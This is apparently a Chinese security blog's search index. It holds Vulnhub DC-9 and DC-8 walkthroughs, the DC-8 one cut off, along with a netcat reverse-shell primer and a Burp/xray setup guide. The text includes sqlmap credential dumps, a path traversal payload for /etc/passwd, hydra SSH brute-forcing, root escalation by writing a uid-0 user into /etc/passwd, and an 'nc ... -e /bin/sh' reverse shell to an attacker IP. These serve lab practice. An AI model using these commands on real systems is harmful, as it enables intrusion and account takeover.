<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>测试</title>
      <link href="/archives/9daba997.html"/>
      <url>/archives/9daba997.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机DC系列-DC9</title>
      <link href="/archives/a3a268b3.html"/>
      <url>/archives/a3a268b3.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><ul><li><strong>Name</strong>: DC: 9</li><li><strong>Date release</strong>: 29 Dec 2019</li><li><strong>Author</strong>: <a href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li><li><strong>Series</strong>: <a href="http://www.vulnhub.com/series/dc,199/">DC</a></li></ul><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>DC-9 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>这一挑战的最终目标是获得根并阅读唯一的标志。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><h2 id="技术信息"><a href="#技术信息" class="headerlink" title="技术信息"></a>技术信息</h2><p>DC-9 是基于 Debian 64 位构建的 VirtualBox VM，但在大多数 PC 上运行它应该没有任何问题。</p><p>DC-9 已在 VMWare Player 上成功测试，但如果在 VMware 中运行此 VM 有任何问题，请通读<a href="http://www.five86.com/vmware.html">此</a>.</p><p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p><p>安装很简单 - 下载它，解压缩，然后将它导入 VirtualBox 或 VMWare，然后就可以了。</p><h2 id="重要的"><a href="#重要的" class="headerlink" title="重要的"></a>重要的</h2><p>虽然使用此 VM 应该没有问题，但通过下载它，您将对此 VM 可能造成的任何意外损坏承担全部责任。</p><p>这么说应该没什么问题，但我觉得有必要把它扔在那里以防万一。</p><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><h2 id="存活主机"><a href="#存活主机" class="headerlink" title="存活主机"></a>存活主机</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917093537957.png" alt="image-20220917093537957"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali   192.168.169.220</span><br><span class="line">dc     192.168.169.241</span><br></pre></td></tr></table></figure><h1 id="目标IP"><a href="#目标IP" class="headerlink" title="目标IP"></a>目标IP</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917111554452.png" alt="image-20220917111554452"></p><h2 id="bp-xray"><a href="#bp-xray" class="headerlink" title="bp+xray"></a>bp+xray</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917094519038.png" alt="image-20220917094519038"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917094443477.png" alt="image-20220917094443477"></p><ul><li>post提交的sql注入</li></ul><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><ul><li>bp抓包,将请求保存</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917095230933.png" alt="image-20220917095230933"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917095354937.png" alt="image-20220917095354937"></p><h2 id="sqlmap开跑"><a href="#sqlmap开跑" class="headerlink" title="sqlmap开跑"></a>sqlmap开跑</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r dc9.txt --batch --level 4 --dbs</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917095613817.png" alt="image-20220917095613817"></p><h3 id="users"><a href="#users" class="headerlink" title="users"></a>users</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r dc9.txt --batch --level 4 -D users --tables</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917095745344.png" alt="image-20220917095745344"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r dc9.txt --batch --level 4 -D users -T UserDetails --columns</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917095902912.png" alt="image-20220917095902912"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r dc9.txt --batch --level 4 -D users -T UserDetails -C username,password --dump</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917100030888.png" alt="image-20220917100030888"></p><ul><li>复制备用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">| username  | password      |</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| monicag   | 3248dsds7s    |</span><br><span class="line">| marym     | 3kfs86sfd     |</span><br><span class="line">| julied    | 468sfdfsd2    |</span><br><span class="line">| fredf     | 4sfd87sfd1    |</span><br><span class="line">| jerrym    | B8m#48sd      |</span><br><span class="line">| bettyr    | BamBam01      |</span><br><span class="line">| janitor2  | Hawaii-Five-0 |</span><br><span class="line">| janitor   | Ilovepeepee   |</span><br><span class="line">| rossg     | ILoveRachel   |</span><br><span class="line">| joeyt     | Passw0rd      |</span><br><span class="line">| wilmaf    | Pebbles       |</span><br><span class="line">| barneyr   | RocksOff      |</span><br><span class="line">| phoebeb   | smellycats    |</span><br><span class="line">| tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| chandlerb | UrAG0D!       |</span><br><span class="line">| rachelg   | yN72#dsd      |</span><br><span class="line">| scoots    | YR3BVxxxw87   |</span><br></pre></td></tr></table></figure><h3 id="Staff"><a href="#Staff" class="headerlink" title="Staff"></a>Staff</h3><ul><li>如果报错重新复制粘贴请求文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r dc9.txt  --level 4 -D staff --tables</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917101347762.png" alt="image-20220917101347762"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r dc9.txt  --level 4 -D Staff -T Users --columns</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917102601216.png" alt="image-20220917102601216"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r dc9.txt  --level 4 -D Staff -T Users -C username,password --dump</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917103235265.png" alt="image-20220917103235265"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">transorbital1</span><br></pre></td></tr></table></figure><ul><li><p>登陆成功</p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917103435018.png" alt="image-20220917103435018"></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File does not exist</span><br><span class="line">文件不存在</span><br></pre></td></tr></table></figure><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><ul><li>这里就不懂了(参考)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">File does not exist //文件不存在</span><br><span class="line"></span><br><span class="line">我为什么就想不到要文件包含呢</span><br><span class="line"></span><br><span class="line">manage.php?file=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917110749263.png" alt="image-20220917110749263"></p><h1 id="knockd"><a href="#knockd" class="headerlink" title="knockd"></a>knockd</h1><ul><li><p>knockd是一种端口试探服务器工具。它侦听以太网或其他可用接口上的所有流量，等待特殊序列的端口命中(port-hit)。telnet或Putty等客户软件通过向服务器上的端口发送TCP或数据包来启动端口命中。</p></li><li><p>也就是说 按照一定顺序去访问敲击特定的端口，就能激活ssh</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.241/manage.php?file=../../../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917111348769.png" alt="image-20220917111348769"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File does not exist</span><br><span class="line">[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn</span><br></pre></td></tr></table></figure><h2 id="ssh状态"><a href="#ssh状态" class="headerlink" title="ssh状态"></a>ssh状态</h2><ul><li>未敲门</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917111608084.png" alt="image-20220917111608084"></p><ul><li>开始敲门</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 7469 192.168.169.241</span><br><span class="line">nmap -p 8475 192.168.169.241</span><br><span class="line">nmap -p 9842 192.168.169.241</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917111743299.png" alt="image-20220917111743299"></p><h3 id="ssh开启"><a href="#ssh开启" class="headerlink" title="ssh开启"></a>ssh开启</h3><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917111847507.png" alt="image-20220917111847507"></p><h1 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h1><ol><li>username全部写入到u文件形成user字典</li><li>之前备用的数据库</li><li>将各个账户的密码也写进p字典中</li><li>然后使用两个字典进行爆破，</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L u -P p ssh://192.168.169.241</span><br></pre></td></tr></table></figure><ul><li><p>user<br>monicag<br>marym<br>julied<br>fredf<br>jerrym<br>bettyr<br>janitor2<br>janitor<br>rossg<br>joeyt<br>wilmaf<br>barneyr<br>phoebeb<br>tomc<br>chandlerb<br>rachelg<br>scoots </p></li><li><p>pass<br>3248dsds7s<br>3kfs86sfd<br>468sfdfsd2<br>4sfd87sfd1<br>B8m#48sd<br>BamBam01<br>Hawaii-Five-0<br>Ilovepeepee<br>ILoveRachel<br>Passw0rd<br>Pebbles<br>RocksOff<br>smellycats<br>TC&amp;TheBoyz<br>UrAG0D!<br>yN72#dsd<br>YR3BVxxxw87</p></li><li><p>爆破成功</p></li><li><p>编辑的文本名字和密码内容后面不能有空格</p></li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917121231669.png" alt="image-20220917121231669"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh  chandlerb@192.168.169.241   UrAG0D!      </span><br><span class="line">ssh  joeyt@192.168.169.241       Passw0rd</span><br><span class="line">ssh  janitor@192.168.169.241     Ilovepeepee     </span><br></pre></td></tr></table></figure><h2 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chandlerb@192.168.169.241   UrAG0D!</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917122442438.png" alt="image-20220917122442438"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh  joeyt@192.168.169.241       Passw0rd</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917122541415.png" alt="image-20220917122541415"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh  janitor@192.168.169.241     Ilovepeepee  </span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917122628498.png" alt="image-20220917122628498"></p><ul><li>最终在janitor 发现个隐藏文件夹</li></ul><h1 id="探索janitor"><a href="#探索janitor" class="headerlink" title="探索janitor"></a>探索janitor</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917123543689.png" alt="image-20220917123543689"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure><h2 id="再次爆破ssh"><a href="#再次爆破ssh" class="headerlink" title="再次爆破ssh"></a>再次爆破ssh</h2><ul><li>把上面的密码添加到爆破的密码文件,继续爆破</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917123833184.png" alt="image-20220917123833184"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.169.241   login: fredf   password: B4-Tru3-001</span><br></pre></td></tr></table></figure><h1 id="fredf连接ssh"><a href="#fredf连接ssh" class="headerlink" title="fredf连接ssh"></a>fredf连接ssh</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh  fredf@192.168.169.241     B4-Tru3-001</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917124121872.png" alt="image-20220917124121872"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917124400311.png" alt="image-20220917124400311"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917124849475.png" alt="image-20220917124849475"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">意思是 读取argv1的内容，然后将1的内容写入argv2。</span><br><span class="line">也就是说 这个python文件 需要两个参数来执行</span><br><span class="line">因为这个文件是root权限，所以这里可以构造参数1：一个root用户和密码，参数2：/etc/passwd</span><br><span class="line">这样这个文件执行 就会创建一个root用户</span><br></pre></td></tr></table></figure><ul><li>接下来看不懂,照着抄</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt kidll 123456789</span><br><span class="line"></span><br><span class="line">-1 #使用md5加密算法</span><br><span class="line">-salt #自动插入盐值</span><br><span class="line"></span><br><span class="line">kidll 123456789 账号 密码</span><br><span class="line"></span><br><span class="line">这串代码系统生成</span><br><span class="line">$1$kali$F4zZpaACn/q8kr0i413b30</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917125208218.png" alt="image-20220917125208218"></p><ul><li>构造用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kidll:$1$kali$F4zZpaACn/q8kr0i413b30:0:0::/root:/bin/bash</span><br><span class="line"></span><br><span class="line">根据/etc/passwd的格式 存放在一个文件里 作为第一个参数</span><br><span class="line"></span><br><span class="line">echo &#x27;kidll:$1$kali$F4zZpaACn/q8kr0i413b30:0:0::/root:/bin/bash&#x27; &gt;/tmp/a    # 这里用tmp 文件夹 这个权限要大一些</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917125454742.png" alt="image-20220917125454742"></p><ul><li>跟上参数 执行test这个文件</li><li>注意目录</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./test /tmp/a /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917130022750.png" alt="image-20220917130022750"></p><ul><li>这样算成功</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917130141058.png" alt="image-20220917130141058"></p><ul><li>root</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917130306534.png" alt="image-20220917130306534"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220917130414938.png" alt="image-20220917130414938"></p><h1 id="vulnhub-dc系列结束"><a href="#vulnhub-dc系列结束" class="headerlink" title="vulnhub dc系列结束"></a>vulnhub dc系列结束</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>netcat反弹shell</title>
      <link href="/archives/74651124.html"/>
      <url>/archives/74651124.html</url>
      
        <content type="html"><![CDATA[<h1 id="netcat基本命令"><a href="#netcat基本命令" class="headerlink" title="netcat基本命令"></a>netcat基本命令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-l： 开启监听</span><br><span class="line">-p：指定端口</span><br><span class="line">-t： 以telnet形式应答</span><br><span class="line">-e：程序重定向</span><br><span class="line">-n：以数字形式表示ip</span><br><span class="line">-v：显示执行命令过程</span><br><span class="line">-z : 不进行交互，直接显示结果</span><br><span class="line">-u ：使用UDP协议传输</span><br><span class="line">-w : 设置超时时间</span><br></pre></td></tr></table></figure><ul><li><strong>首先应该知道的一个参数是 - h，这是最基本的一个命令，nc 长跟的参数有两个，一个是 n 一个是 v</strong></li><li><strong>v 参数就是列出执行过程的详细信息，n 参数翻译过来就是只接收 ip 地址，没有 dns</strong></li></ul><h2 id="为什么一个打印消息的要写两次呢？"><a href="#为什么一个打印消息的要写两次呢？" class="headerlink" title="为什么一个打印消息的要写两次呢？"></a>为什么一个打印消息的要写两次呢？</h2><ul><li><p>都知道-l是开启监听，-v打印运行时的所有信息，-p指定端口通常合起来写：nc -lvp 6666</p></li><li><p>为什么一个打印消息的要写两次呢？</p></li><li><p>几个V结果都一样 后来发现两个v获得的输出更详细，Nmap的-vv同样的效果</p></li></ul><h1 id="netcat版本："><a href="#netcat版本：" class="headerlink" title="netcat版本："></a>netcat版本：</h1><h2 id="常用监听设置"><a href="#常用监听设置" class="headerlink" title="常用监听设置"></a>常用监听设置</h2><ul><li>例如</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机IP :  192.168.10.10</span><br><span class="line">目标机IP :  192.168.20.20</span><br></pre></td></tr></table></figure><ol><li>在攻击机上设置监听</li></ol><ul><li><strong>6666 是端口,可以自行更改</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><ol start="2"><li>目标机设置</li></ol><ul><li>各种手段后能执行命令后</li><li>注意IP是攻击机的IP</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.10.10 6666 -e /bin/sh</span><br></pre></td></tr></table></figure><ol start="3"><li>交互</li></ol><ul><li>对于已经安装了python的系统,可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit联动xray</title>
      <link href="/archives/7da502be.html"/>
      <url>/archives/7da502be.html</url>
      
        <content type="html"><![CDATA[<h1 id="burpsuit设置"><a href="#burpsuit设置" class="headerlink" title="burpsuit设置"></a>burpsuit设置</h1><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>参考之前文章: <a href="https://putdown.top/archives/46a16768.html">https://putdown.top/archives/46a16768.html</a></p><h2 id="xray的监听"><a href="#xray的监听" class="headerlink" title="xray的监听"></a>xray的监听</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916193447191.png" alt="image-20220916193447191"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916193509957.png" alt="image-20220916193509957"></p><ul><li><strong>端口的话可以自行更改,后续在<code>xray</code>的一直就行</strong></li></ul><h1 id="xray的设置"><a href="#xray的设置" class="headerlink" title="xray的设置"></a>xray的设置</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webscan --listen 127.0.0.1:7777 --html-output result.html</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916194427144.png" alt="image-20220916194427144"></p><ul><li>这样算成功</li></ul><h1 id="联动的使用"><a href="#联动的使用" class="headerlink" title="联动的使用"></a>联动的使用</h1><ol><li>浏览器开启burpsuit的代理</li></ol><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916194918080.png" alt="image-20220916194918080"></p><ol start="2"><li>burpsuit 的拦截可以不用开</li></ol><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916194945144.png" alt="image-20220916194945144"></p><ol start="3"><li>xray产生数据就算成功</li></ol><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916195136747.png" alt="image-20220916195136747"></p><ol start="4"><li>在需要测试网站点击需要测试的功能点</li><li>xray报告的位置</li></ol><ul><li><p>在xray的安装目录</p></li><li><p>文件名是 <strong>webscan –listen 127.0.0.1:7777 –html-output result.html</strong> 这条命令<strong>result.html</strong>的这个部分,可根据自己情况更改</p></li><li><p>设置的时候注意端口号,如果报告已存在相同文件名,命令将执行失败,重新设置名称即可</p></li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916195500195.png" alt="image-20220916195500195"></p><ul><li>报告的内容自行了解</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机DC系列-DC8</title>
      <link href="/archives/d4a55825.html"/>
      <url>/archives/d4a55825.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><ul><li><strong>Name</strong>: DC: 8</li><li><strong>Date release</strong>: 8 Sep 2019</li><li><strong>Author</strong>: <a href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li><li><strong>Series</strong>: <a href="http://www.vulnhub.com/series/dc,199/">DC</a></li><li><strong>Web page</strong>: <a href="http://www.five86.com/dc-8.html">http://www.five86.com/dc-8.html</a></li></ul><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>DC-8 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>这个挑战有点混合实际挑战和“概念证明”，即在 Linux 上安装和配置的双因素身份验证是否可以防止 Linux 服务器被利用。</p><p>这个挑战的“概念证明”部分最终是由于 Twitter 上关于双因素身份验证和 Linux 的问题，以及@theart42 的建议。</p><p>此挑战的最终目标是绕过双重身份验证，获取 root 权限并读取唯一标志。</p><p>除非您尝试通过 SSH 登录，否则您可能甚至不知道已安装和配置了双因素身份验证，但它肯定存在并且可以正常工作。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><h1 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h1><h2 id="扫描存活"><a href="#扫描存活" class="headerlink" title="扫描存活"></a>扫描存活</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916102049862.png" alt="image-20220916102049862"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali 192.168.169.220</span><br><span class="line">dc   192.168.169.235</span><br></pre></td></tr></table></figure><h2 id="扫描目标ip"><a href="#扫描目标ip" class="headerlink" title="扫描目标ip"></a>扫描目标ip</h2><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20220916102255207.png" alt="image-20220916102255207"></p><h2 id="访问http"><a href="#访问http" class="headerlink" title="访问http"></a>访问http</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916102419885.png" alt="image-20220916102419885"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916102538043.png" alt="image-20220916102538043"></p><h2 id="扫描网站"><a href="#扫描网站" class="headerlink" title="扫描网站"></a>扫描网站</h2><ul><li>burpsuit + xray</li></ul><ol><li>xray</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webscan --listen 127.0.0.1:7777 --html-output result.html</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916105036999.png" alt="image-20220916105036999"></p><ol start="2"><li>burpsuit</li></ol><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916105138020.png" alt="image-20220916105138020"></p><ol start="3"><li>浏览器设置burpsuitp的代理</li><li>对网站的每个能点击的功能点进行测试</li><li>在xray的根目录能看到一份报告 <code>result.html</code> 和上面的命令有关可更改</li></ol><h2 id="扫描报告"><a href="#扫描报告" class="headerlink" title="扫描报告"></a>扫描报告</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220916105936391.png" alt="image-20220916105936391"></p><ul><li><strong>发现<code>sql</code>注入在<code>nid</code>的位置</strong></li></ul><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><figure class="highlight plaintext"><table><tr><td 